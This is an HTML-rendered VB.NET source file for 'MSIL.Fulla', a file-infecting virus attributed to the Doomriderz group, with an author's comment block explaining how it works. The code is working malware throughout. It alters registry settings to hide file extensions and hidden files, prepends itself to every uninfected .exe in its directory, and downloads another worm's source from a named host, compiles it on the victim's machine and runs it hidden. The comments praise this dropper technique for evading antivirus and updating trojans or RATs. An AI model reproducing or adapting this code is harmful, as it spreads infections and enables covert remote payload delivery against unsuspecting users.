<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MSIL.Fulla - fulla.vb.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'     free0n {Doomriderz}                                                   '
'       MSIL.Fulla.Virus                                                     '
'        RIP MLK 2007!                                                      '
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'How it works! (Av don't skim)                                              '
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'Name:Fulla (Gemanic Goddess)                                               '
'1. Checks the registry and turns off Show File Extensions                  '
'   And Show Hidden Files                                                   '
'2. Infects files in the current directory by finding all                   '
'   exe files and prepending it's code to the host. There                   '
'   is ability for it'self to generate a temp file to launch                '
'   the original program after infection                                    '
'3. The most interesting part is that it downloads the source               '
'   code for genetix's Nurofen worm. Then compiles it and builds            ' 
'   an executable and executes the code! I've never seen this  before.      '
'   So what's the benefits? we can now upload anytype of file then have our '
'   program download and build the source code so we don't have to build    '
'   a downloader that just downloads an exe file and possibly get blocked.  '
'   file size is probably another benfit and updating say your trojan could '
'   be alot easier if you could just upload ur code changes and then have   '
'   your rat download and make a new build of itself all on the victim's    '
'   computer.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.IO</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Text</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Net</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Diagnostics</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">Microsoft.Win32</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.CodeDom</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.CodeDom.Compiler</span><span class="sc0">

</span><span class="sc3">Module</span><span class="sc0"> </span><span class="sc7">Module1</span><span class="sc0">
    </span><span class="sc1">'fulla is our current virus process name
</span><span class="sc0">    </span><span class="sc1">'myDir is duh the current directory path
</span><span class="sc0">    </span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">fulla</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Convert.ToString</span><span class="sc6">(</span><span class="sc7">Process.GetCurrentProcess</span><span class="sc6">().</span><span class="sc7">MainModule.FileName</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">myDir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Directory.GetCurrentDirectory</span><span class="sc6">()</span><span class="sc0">

    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Main</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc1">'Each sub is called in order
</span><span class="sc0">        </span><span class="sc1">'DownloadAndCompile is the most interesting part
</span><span class="sc0">        </span><span class="sc1">'also the prepender :)
</span><span class="sc0">        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Reg</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Infect</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">DownloadAndCompile</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Reg</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc1">'Basically this is pretty simple
</span><span class="sc0">        </span><span class="sc1">'we just set the hide file extensions to 1
</span><span class="sc0">        </span><span class="sc1">'and don't show hidden files since we do a lot with both
</span><span class="sc0">        </span><span class="sc1">'it makes since to do hide them :)
</span><span class="sc0">        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">RegistryKey</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Registry.CurrentUser.OpenSubKey</span><span class="sc6">(</span><span class="sc4">"SoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">r.SetValue</span><span class="sc6">(</span><span class="sc4">"Hidden"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">r.SetValue</span><span class="sc6">(</span><span class="sc4">"HideFileExt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">r.Close</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Infect</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc1">'Basic prepender virus
</span><span class="sc0">        </span><span class="sc1">'works like this:
</span><span class="sc0">        </span><span class="sc1">'1. reads the current file into a byte array
</span><span class="sc0">        </span><span class="sc1">'2. Gets a list of all the files in the current directory
</span><span class="sc0">        </span><span class="sc1">'3. checks a byte marker hostbyte(60) if it's not equal then assumes it's an uninfected file
</span><span class="sc0">        </span><span class="sc1">'4. if file is new file then write the virus to the first part of the exe then write the host bytes
</span><span class="sc0">        </span><span class="sc1">'5. does a file size check to make sure that if it's not running as a infected file
</span><span class="sc0">        </span><span class="sc1">'6. if it's running as an infected file it will extract the host bytes and execute it
</span><span class="sc0">        </span><span class="sc1">'7. once the original app is extracted it launches and waits for exit then deletes the temp file
</span><span class="sc0">        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">myBytes</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
        </span><span class="sc7">myBytes</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ReadBytes</span><span class="sc6">(</span><span class="sc7">fulla</span><span class="sc6">)</span><span class="sc0">

        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Directory.GetFiles</span><span class="sc6">(</span><span class="sc7">myDir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"*.exe"</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hostBytes</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
            </span><span class="sc7">hostBytes</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ReadBytes</span><span class="sc6">(</span><span class="sc11">file</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc1">'byte check
</span><span class="sc0">            </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">hostBytes</span><span class="sc6">(</span><span class="sc2">60</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc6">(</span><span class="sc11">file</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileMode.Open</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAccess.Write</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">BinaryWriter</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">BinaryWriter</span><span class="sc6">(</span><span class="sc7">fs</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc1">'write virus bytes
</span><span class="sc0">                </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">v</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
                </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">v</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">myBytes.Length</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc7">bw.BaseStream.WriteByte</span><span class="sc6">(</span><span class="sc7">myBytes</span><span class="sc6">(</span><span class="sc7">v</span><span class="sc6">))</span><span class="sc0">
                </span><span class="sc3">Next</span><span class="sc0">
                </span><span class="sc1">'write host bytes
</span><span class="sc0">                </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">h</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
                </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">h</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">hostBytes.Length</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc7">bw.BaseStream.WriteByte</span><span class="sc6">(</span><span class="sc7">hostBytes</span><span class="sc6">(</span><span class="sc7">h</span><span class="sc6">))</span><span class="sc0">
                </span><span class="sc3">Next</span><span class="sc0">

                </span><span class="sc7">bw.Flush</span><span class="sc6">()</span><span class="sc0">
                </span><span class="sc7">bw.Close</span><span class="sc6">()</span><span class="sc0">
                </span><span class="sc7">fs.Close</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0">

        </span><span class="sc1">'Check the file size we know how big our exe file size is
</span><span class="sc0">        </span><span class="sc1">'so if we are running as an infected file our file size will obviously
</span><span class="sc0">        </span><span class="sc1">'be greater. Then we just extract the host program ourself and write it to a
</span><span class="sc0">        </span><span class="sc1">'temp file and execute it. Once the user is done we delete it so we don't
</span><span class="sc0">        </span><span class="sc1">'infect it the next time.
</span><span class="sc0">        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">myBytes.Length</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">28672</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Random</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">Random</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">tmpfile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">r.Next</span><span class="sc6">(</span><span class="sc2">30</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fstmp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc6">(</span><span class="sc7">tmpfile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileMode.Create</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bwtmp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">BinaryWriter</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">BinaryWriter</span><span class="sc6">(</span><span class="sc7">fstmp</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">File.SetAttributes</span><span class="sc6">(</span><span class="sc7">tmpfile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAttributes.Hidden</span><span class="sc6">)</span><span class="sc0">

            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
            </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">28672</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">myBytes.Length</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc7">bwtmp.BaseStream.WriteByte</span><span class="sc6">(</span><span class="sc7">myBytes</span><span class="sc6">(</span><span class="sc7">t</span><span class="sc6">))</span><span class="sc0">
            </span><span class="sc3">Next</span><span class="sc0">

            </span><span class="sc7">bwtmp.Flush</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc7">fstmp.Close</span><span class="sc6">()</span><span class="sc0">

            </span><span class="sc7">Process.Start</span><span class="sc6">(</span><span class="sc7">tmpfile</span><span class="sc6">).</span><span class="sc7">WaitForExit</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc7">File.Delete</span><span class="sc6">(</span><span class="sc7">tmpfile</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">DownloadAndCompile</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc1">'Download and Compile Genetix's Nurofen worm
</span><span class="sc0">        </span><span class="sc1">'the point is to show that you can make droppers 
</span><span class="sc0">        </span><span class="sc1">'that can read any type of file from the web and then build the code
</span><span class="sc0">        </span><span class="sc1">'so your not downloading an exe or a suspected suspcious
</span><span class="sc0">        </span><span class="sc1">'file granted you shouldn't use this on our server :)
</span><span class="sc0">        </span><span class="sc1">'but this is an example!
</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">request</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WebRequest</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WebRequest.Create</span><span class="sc6">(</span><span class="sc4">"http://vx.netlux.org/doomriderz/projects/Nurofen.txt"</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">response</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HttpWebResponse</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CType</span><span class="sc6">(</span><span class="sc7">request.GetResponse</span><span class="sc6">(),</span><span class="sc0"> </span><span class="sc7">HttpWebResponse</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">dataStream</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Stream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">response.GetResponseStream</span><span class="sc6">()</span><span class="sc0">

        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">Random</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">r.Next</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">srcTmpName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".dat"</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">StreamReader</span><span class="sc6">(</span><span class="sc7">dataStream</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">data</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sr.ReadToEnd</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">StreamWriter</span><span class="sc6">(</span><span class="sc7">srcTmpName</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">sw.WriteLine</span><span class="sc6">(</span><span class="sc7">data</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">sw.Flush</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc7">sw.Close</span><span class="sc6">()</span><span class="sc0">

        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">File.Exists</span><span class="sc6">(</span><span class="sc7">srcTmpName</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc1">'File.SetAttributes(srcTmpName, FileAttributes.Hidden)
</span><span class="sc0">            </span><span class="sc1">'Compile the source file that we downloaded
</span><span class="sc0">            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ic</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">ICodeCompiler</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">VBCodeProvider</span><span class="sc6">().</span><span class="sc7">CreateCompiler</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">cp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">CompilerParameters</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc7">cp.ReferencedAssemblies.Add</span><span class="sc6">(</span><span class="sc4">"System.dll"</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">cp.ReferencedAssemblies.Add</span><span class="sc6">(</span><span class="sc4">"System.Windows.Forms.dll"</span><span class="sc6">)</span><span class="sc0">

            </span><span class="sc7">cp.GenerateExecutable</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc7">cp.CompilerOptions</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"/target:winexe"</span><span class="sc0">
            </span><span class="sc7">cp.OutputAssembly</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">

            </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">cr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">CompilerResults</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ic.CompileAssemblyFromFile</span><span class="sc6">(</span><span class="sc7">cp</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">srcTmpName</span><span class="sc6">)</span><span class="sc0">

            </span><span class="sc1">'Make sure that when we compile we didn't have 
</span><span class="sc0">            </span><span class="sc1">'errors if we did then no file would have been generated
</span><span class="sc0">            </span><span class="sc1">'if the file exists we set the file to hidden and then execute it
</span><span class="sc0">            </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">File.Exists</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                </span><span class="sc7">File.SetAttributes</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAttributes.Hidden</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">Process.Start</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc6">).</span><span class="sc7">WaitForExit</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

            </span><span class="sc1">'Delete source file that we download
</span><span class="sc0">            </span><span class="sc1">'and the nurofen worm cause we have already 
</span><span class="sc0">            </span><span class="sc1">'executed it.
</span><span class="sc0">            </span><span class="sc7">File.Delete</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">File.Delete</span><span class="sc6">(</span><span class="sc7">srcTmpName</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ReadBytes</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc1">'TO save much needed space and to keep from having to write
</span><span class="sc0">        </span><span class="sc1">'this code 3 or 4 times it's in it's own function!
</span><span class="sc0">        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc6">(</span><span class="sc7">d</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileMode.Open</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAccess.Read</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">br</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">BinaryReader</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">BinaryReader</span><span class="sc6">(</span><span class="sc7">fs</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fi</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">FileInfo</span><span class="sc6">(</span><span class="sc7">d</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">br.ReadBytes</span><span class="sc6">(</span><span class="sc3">CInt</span><span class="sc6">(</span><span class="sc7">fi.Length</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc7">br.Close</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc7">fs.Close</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Return</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Module</span></div></body>
</html>
